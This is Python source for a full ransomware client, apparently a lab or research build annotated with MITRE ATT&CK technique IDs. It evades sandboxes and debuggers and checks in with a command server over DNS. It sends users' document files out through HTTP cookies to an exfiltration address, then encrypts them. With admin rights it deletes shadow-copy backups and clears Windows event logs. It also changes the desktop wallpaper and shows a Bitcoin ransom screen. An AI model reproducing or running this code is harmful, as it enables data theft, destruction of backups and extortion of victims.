from base64 import b64decode, b64encode
from json import dumps, loads
from platform import processor, uname, win32_edition, win32_is_iot
from os.path import expandvars, isfile, join
from os import getcwd
from time import sleep
from urllib.request import urlretrieve
from queue import Queue

from mwutils.command_and_control.dns import dns_send
from mwutils.command_and_control.helper import build_packets, domainsafe_b64encode
from mwutils.command_and_control.symmetric_cryptography import gen_aes256_key, aes256_decrypt
from mwutils.command_and_control.asymmetric_cryptography import rsa_enc
from mwutils.command_and_control.web_protocols import http_cookie
from mwutils.defense_evasion.debugger_evasion import detect_debugger_gettrace, detect_debugger_stack
from mwutils.defense_evasion.virtualization_sandbox_evasion import Sandbox, Virtualization
from mwutils.discovery.file_and_directory_discovery import get_home_directories, explore_directories
from mwutils.discovery.system_owner_user_discovery import has_elevated_privileges
from mwutils.defense_evasion.indicator_removal import clear_windows_event_logs
from mwutils.impact.inhibit_system_recovery import vssadmin_shadow
from mwutils.impact.internal_defacement import change_desktop_background
from mwutils.impact.data_encrypted_for_impact import aes_decrypt, aes_encrypt
from mwutils.impact.helper import add_extension, remove_extension
from mwutils.gui.gui_main import App
from mwutils.gui.ransomware import RW

DNS_ADDRESS = "192.168.178.70"
EXFIL_ADDRESS = "http://192.168.178.70/api"

base_paths = [ join(d, "Documents") for d in  get_home_directories()]

pub = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAxjE6Ztz8CrWG77R4m7Er
1aVd/WWcx/ttBomHzLma622ZAYx2QaIXbYGDfeJ8yBRcVmnJ9udj7Y0PXWJYTU2s
LODu6dKqJ8zYSZz5j+86HRR9fQ1TTAA+ZKDtoTPvoTXRV0qBhHKjRCxynZ1SNqmb
tbazdOrUolSm4grNteNVbGTwzFue14cfTnVREFAssPxF38TKZOB2uYhocgma8nkb
P21mS1eiiej6FJ/fqeUtcC6z9gYLButEdP2MzC5CWXypuoxAU7qNC+gW1NaEZ9+C
6a8zqXszxfdNm9vp5kxRLe5xuPz+BxaoSu+ILiBS8p4vS+p2MDi4mcdrNwMapc7C
m3D9W5p6q8yV72vgG05TB3zwhyrqsMLHN8DK0WyERo9ykbOqsF6ObMWhAI+c1OlB
j8C4dlfeZd5XgCBGFD3AsxeP6Cra1ywgw3g3WKo1YzEu48AyrH2JL8UnFIBO76Oa
2bJW/xNBnHq22brIH15wY3qo4y1aWMCmF01xu+aH2QRn/nGo5geRAnkn5YrkqS+9
nJzYeia7t0SMMI4YmGxJMZN67dKsvXvHyzqKFBJkX+bP8jbQP8zHZJAnkf/rz+QV
c9n9BaQD8oqQWj9Yeh+KTT9yRnj/p7vTVuGTSx+il4+4ZWSK4tmupQZb1wQlp5BQ
SRQv8aXvqeAjlYoVVw+iC4ECAwEAAQ==
-----END PUBLIC KEY-----"""

def run_ransomware():
    global guid

    # sleep(60*10)     # + sleep is Mitre ID: T1497.003                                   # sleep for 10 minutes to evade sandbox     # ToDo uncomment

    # Collect system information
    info = uname()._asdict()
    info['processor'] = processor()
    info['win_edition'] = win32_edition()
    info['win_iot'] = win32_is_iot()
    info['dns'] = Sandbox.via_dns()
    info['debug_gettrace'] = detect_debugger_gettrace()
    info['virt_win'] = Virtualization.Windows.is_virtualized()
    info['debug_stack'] = detect_debugger_stack()
    info['admin'] = has_elevated_privileges()

    session_key = gen_aes256_key()
    info['session_key'] = b64encode(session_key).decode("ascii")

    if info['dns'] > 0.5 or info['debug_gettrace']:
        return False                                    # Suspicious system detected

    json_info = dumps(info, separators=(',', ':'))
    # Encrypt system information
    encrypted_session_key, nonce, tag, ciphertext = rsa_enc(json_info.encode("utf-8"), pub)
    # 512 16 16 <lenght message>
    json_info = encrypted_session_key + nonce + tag + ciphertext
    # Split encrypted system information into packages that fit into a subdomain
    packets = build_packets("", json_info, 45)
    num_of_packets = len(packets)
    # Send encrypted system information to cc -> get key to encrypt system
    for i, packet in enumerate(packets):
        packet = domainsafe_b64encode(packet)
        response = dns_send(packet, guid, "example.com", address=[DNS_ADDRESS])
        if i == num_of_packets - 1:
            response = b64decode(response).decode("utf-8")

            response = loads(response)

            nonce = b64decode(response["nonce"])
            ciphertext = b64decode(response["ciphertext"])
            tag = b64decode(response["tag"])

            key = aes256_decrypt(session_key, nonce,ciphertext,tag)
    del session_key
    del info['session_key']

    if key == b"":
        return False

    # Discover file system
    file_queue = explore_directories(base_paths, file_type=("txt", "jpg", "png", "db"))
    encrypt_file_queue = Queue()

    # Exfiltrate data
    while not file_queue.empty():
        file = file_queue.get()
        with open(file, "rb") as fp:
            file_name = b64encode(fp.name.encode("utf-8")).decode("ascii") # unicode file names ...
            encrypted_session_key, nonce, tag, ciphertext = rsa_enc(fp.read(), pub)
            # 512 16 16 <lenght message>
            data = encrypted_session_key + nonce + tag + ciphertext
            for packet in build_packets(file_name, data, 4096):
                data = {guid:b64encode(packet).decode("ascii")}
                response = http_cookie(EXFIL_ADDRESS, data, timeout=5)

        encrypt_file_queue.put(file)


    # Encrypt data
    while not encrypt_file_queue.empty():
        # encrypt files and rename
        file = encrypt_file_queue.get()
        aes_encrypt(file, key)
        add_extension(file)

    # Delete key
    del key
    
    if info["admin"] is True:
        # Delete backups
        vssadmin_shadow()
        # Clear Windows Event Logs
        clear_windows_event_logs()

    internal_defacement()
    return True # Show GUI

def internal_defacement():
    # does not seem to have immediate effect. maybe log out and back in?
    background_url = "https://upload.wikimedia.org/wikipedia/commons/6/65/2017_Petya_cyberattack_screenshot.png"
    background_name = "ransomware.png"
    file_path = join(expandvars(r"%Temp%"), background_name)
    urlretrieve(background_url, file_path)
    change_desktop_background(file_path)

def gui() -> None:
    global guid

    def decryption_function():
        """Function for the decryption button
        """
        global guid
        key = dns_send(guid, "update.example.com", address=[DNS_ADDRESS])
        if key != "":
            key = b64decode(key.encode('ascii'))

            # explore again because of file extension changes
            fq = explore_directories(base_paths, file_type=("encrypted",))   
            # decrypt files and remove extension
            while not fq.empty():
                file = fq.get()
                aes_decrypt(file, key)
                remove_extension(file)

    html = """<p>Your files have been encrypted.<br>
            Pay to get them back & prevent your data to be published!</p>
            <p>Instructions you have to follow:</p>
            <ol>
                <li>Buy a Bitcoin</li>
                <li>Pay: 1 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</li>
                <li>Press the green Decrypt button</li>
            </ol>
            """

    frames = (
            {'class': RW, 'para': {'decrypt_function': decryption_function, 'info_html':html}},
    )
    app = App(
            tk_frames=frames, visible_frame=RW, window_width=800, window_height=300
    )


    app.mainloop()
# + https://attack.mitre.org/techniques/T1132/
# All data is encoded with base64
# 
if __name__ == "__main__":
    # Check if system is encrypted by checking if a file exists
    filename = "do_not_delete.txt"
    filename = join(expandvars(r"%systemdrive%\Windows\Temp"), filename)
    if isfile(filename):
        with open(filename, "r") as file:
            guid = file.read()
        gui()
    else:
        with open(filename, "w") as file:
            # Client hello to cc -> guid
            guid = dns_send("example.com", address=[DNS_ADDRESS])
            file.write(guid)                                # save guid
        if run_ransomware():
            gui()
